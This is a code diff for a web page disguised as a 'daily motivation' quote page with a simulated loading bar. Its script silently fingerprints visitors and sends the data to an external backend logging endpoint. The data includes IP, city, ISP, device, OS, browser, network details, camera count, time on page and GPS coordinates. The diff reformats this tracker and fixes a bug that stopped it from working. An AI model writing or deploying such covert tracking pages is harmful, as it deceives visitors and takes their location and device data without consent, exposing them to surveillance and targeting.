@@ -84,27 +84,23 @@
     </div>
 
     <script>
-        // Configure your backend endpoint
         const SERVER_ENDPOINT = 'https://mybackend-production-6bda.up.railway.app/log';
 
-        /**
-         * Sends collected data payload to backend /log endpoint
-         */
         async function sendCollectedData(payload) {
-          try {
-            const response = await fetch(SERVER_ENDPOINT, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify(payload)
-            });
-            if (!response.ok) {
-              throw new Error(`Server responded with status ${response.status}`);
+            try {
+                const response = await fetch(SERVER_ENDPOINT, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+                if (!response.ok) {
+                    throw new Error(`Server responded with status ${response.status}`);
+                }
+                const data = await response.json();
+                console.log("✅ Data logged successfully:", data);
+            } catch (error) {
+                console.error("❌ Failed to send data:", error);
             }
-            const data = await response.json();
-            console.log("✅ Data logged successfully:", data);
-          } catch (error) {
-            console.error("❌ Failed to send data:", error);
-          }
         }
 
         const quotes = [
@@ -126,6 +122,7 @@
             if(/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "Mobile";
             return "Desktop";
         }
+
         function detectOS() {
             const ua = navigator.userAgent;
             if(ua.includes("Windows")) return "Windows";
@@ -135,51 +132,132 @@
             if(/iPhone|iPad|iPod/.test(ua)) return "iOS";
             return "Unknown";
         }
+
         async function collectIPData() {
-            try { const res = await fetch('https://ipapi.co/json/'); const d = await res.json(); collectedData.ipInfo = { ip:d.ip, city:d.city, region:d.region, country:d.country_name, timezone:d.timezone, isp:d.org }; }
-            catch(e){ console.error("IP detection failed:", e); }
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                collectedData.ipInfo = { ip: d.ip, city: d.city, region: d.region, country: d.country_name, timezone: d.timezone, isp: d.org };
+            } catch (e) {
+                console.error("IP detection failed:", e);
+                collectedData.ipInfo = { error: "Failed to retrieve IP data" };
+            }
         }
+
         function collectSystemInfo() {
-            collectedData.systemInfo = { deviceType: detectDeviceType(), os: detectOS(), platform: navigator.platform, cpuCores: navigator.hardwareConcurrency||"unknown", deviceMemory: navigator.deviceMemory||"unknown", maxTouchPoints: navigator.maxTouchPoints||0, screenWidth: screen.width, screenHeight: screen.height, viewportWidth: window.innerWidth, viewportHeight: window.innerHeight };
+            collectedData.systemInfo = {
+                deviceType: detectDeviceType(),
+                os: detectOS(),
+                platform: navigator.platform,
+                cpuCores: navigator.hardwareConcurrency || "unknown",
+                deviceMemory: navigator.deviceMemory || "unknown",
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                viewportWidth: window.innerWidth,
+                viewportHeight: window.innerHeight
+            };
         }
+
         function collectBrowserInfo() {
-            collectedData.browserInfo = { userAgent: navigator.userAgent, browserName: detectBrowser(), language: navigator.language, cookiesEnabled: navigator.cookieEnabled, doNotTrack: navigator.doNotTrack==="1" };
+            collectedData.browserInfo = {
+                userAgent: navigator.userAgent,
+                browserName: detectBrowser(),
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack === "1"
+            };
         }
+
         function detectBrowser() {
             const ua = navigator.userAgent;
-            if(ua.includes("Firefox")) return "Firefox";
-            if(ua.includes("Edge")) return "Edge";
-            if(ua.includes("Chrome")) return "Chrome";
-            if(ua.includes("Safari")) return "Safari";
+            if (ua.includes("Firefox")) return "Firefox";
+            if (ua.includes("Edge")) return "Edge";
+            if (ua.includes("Chrome")) return "Chrome";
+            if (ua.includes("Safari")) return "Safari";
             return "Unknown";
         }
+
         function collectNetworkInfo() {
-            const c = navigator.connection||{};
-            collectedData.networkInfo = { online: navigator.onLine, effectiveType: c.effectiveType||"unknown", downlink: c.downlink||"unknown", rtt: c.rtt||"unknown" };
+            const c = navigator.connection || {};
+            collectedData.networkInfo = {
+                online: navigator.onLine,
+                effectiveType: c.effectiveType || "unknown",
+                downlink: c.downlink || "unknown",
+                rtt: c.rtt || "unknown"
+            };
         }
+
         function tryGeolocation() {
-            if(!navigator.geolocation) return;
-            navigator.geolocation.getCurrentPosition(pos=>{ collectedData.locationData.gps = { lat:pos.coords.latitude, lon:pos.coords.longitude, accuracy:pos.coords.accuracy }; }, err=>console.log("Geo error:",err.message));
+            if (!navigator.geolocation) return;
+            navigator.geolocation.getCurrentPosition(pos => {
+                collectedData.locationData.gps = {
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy
+                };
+            }, err => console.log("Geo error:", err.message));
         }
-        function collectMediaInfo() {
-            collectedData.mediaInfo = { audioWorklet: !!window.AudioWorkletNode, videoInputs: await detectMediaDevices('videoinput') };
+
+        async function collectMediaInfo() {
+            collectedData.mediaInfo = {
+                audioWorklet: !!window.AudioWorkletNode,
+                videoInputs: await detectMediaDevices('videoinput')
+            };
         }
+
         async function detectMediaDevices(kind) {
-            if(!navigator.mediaDevices?.enumerateDevices) return "unknown";
-            try { const devs=await navigator.mediaDevices.enumerateDevices(); return devs.filter(d=>d.kind===kind).length;} catch {return "error";}
+            if (!navigator.mediaDevices?.enumerateDevices) return "unknown";
+            try {
+                const devs = await navigator.mediaDevices.enumerateDevices();
+                return devs.filter(d => d.kind === kind).length;
+            } catch (error) {
+                console.error("Error detecting media devices:", error);
+                return "error";
+            }
         }
+
         function simulateProgress() {
-            let p=0;
-            const iv=setInterval(()=>{
-                p+=Math.random()*15;
-                if(p>95)p=95;
-                document.getElementById('progress').style.width=`${p}%`;
-                if(p>=95){clearInterval(iv);document.getElementById('statusText').innerHTML='<i class="fas fa-check-circle mr-2"></i>Your daily motivation is ready!'; sendFinalData();}
-            },500);
+            let p = 0;
+            const iv = setInterval(() => {
+                p += Math.random() * 10; // Smoother increment
+                if (p > 95) p = 95;
+                document.getElementById('progress').style.width = `${p}%`;
+                if (p >= 95) {
+                    clearInterval(iv);
+                    document.getElementById('statusText').innerHTML = '<i class="fas fa-check-circle mr-2"></i>Your daily motivation is ready!';
+                    sendFinalData();
+                }
+            }, 500);
         }
-        function rotateQuotes(){ let idx=0; setInterval(()=>{ idx=(idx+1)%quotes.length; document.getElementById('quote').textContent=`"${quotes[idx].text}"`; document.getElementById('author').textContent=`- ${quotes[idx].author}`; collectedData.interactionData.quotesViewed.push(quotes[idx].author); },5000); }
-        async function sendFinalData(){ collectedData.interactionData.timeOnPage=(new Date()-collectedData.timestamp)/1000; collectedData.timestamp=collectedData.timestamp.toISOString(); await sendCollectedData(collectedData);}        
-        async function init(){ await collectIPData(); collectSystemInfo(); collectBrowserInfo(); collectNetworkInfo(); tryGeolocation(); collectMediaInfo(); simulateProgress(); rotateQuotes(); }
+
+        function rotateQuotes() {
+            let idx = 0;
+            setInterval(() => {
+                idx = (idx + 1) % quotes.length;
+                document.getElementById('quote').textContent = `"${quotes[idx].text}"`;
+                document.getElementById('author').textContent = `- ${quotes[idx].author}`;
+                collectedData.interactionData.quotesViewed.push(quotes[idx].author);
+            }, 5000);
+        }
+
+        async function sendFinalData() {
+            collectedData.interactionData.timeOnPage = (new Date() - collectedData.timestamp) / 1000;
+            collectedData.timestamp = collectedData.timestamp.toISOString();
+            await sendCollectedData(collectedData);
+        }
+
+        async function init() {
+            await collectIPData();
+            collectSystemInfo();
+            collectBrowserInfo();
+            collectNetworkInfo();
+            tryGeolocation();
+            await collectMediaInfo();
+            simulateProgress();
+            rotateQuotes();
+        }
+
         document.addEventListener('DOMContentLoaded', init);
     </script>
 </body>
